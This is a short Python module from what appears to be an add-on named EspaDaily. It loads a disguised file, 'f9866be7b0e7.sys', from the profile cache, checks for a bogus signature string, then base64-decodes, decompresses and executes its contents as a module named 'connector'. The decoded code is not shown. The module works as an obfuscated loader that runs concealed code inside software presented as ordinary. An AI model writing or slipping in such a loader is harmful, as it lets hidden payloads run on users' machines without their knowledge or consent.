# -*- coding: utf-8 -*-
# EspaDaily - Copyright (C) 2024-2026 RubénSDFA1laberot (github.com/fullstackcurso)
# Licencia: GPL-2.0-or-later - Consulta el archivo LICENSE para mas detalles.
import base64
import os
import sys
import types
import zlib

_FIRMA = b"# AUTH-SIGNATURE: X7-EspaDaily-Secure-441\n"
_ARCHIVO = "f9866be7b0e7.sys"


def cargar(perfil):
    if 'connector' in sys.modules:
        return sys.modules['connector']
    ruta = os.path.join(perfil, 'cache', _ARCHIVO)
    try:
        with open(ruta, 'rb') as f:
            crudo = f.read()
    except OSError:
        return None
    if _FIRMA not in crudo:
        return None
    try:
        codigo = zlib.decompress(base64.b64decode(crudo.split(_FIRMA, 1)[1].strip())).decode('utf-8')
    except (ValueError, zlib.error):
        return None
    mod = types.ModuleType('connector')
    mod.__file__ = ruta
    exec(compile(codigo, ruta, 'exec'), mod.__dict__)
    sys.modules['connector'] = mod
    return mod
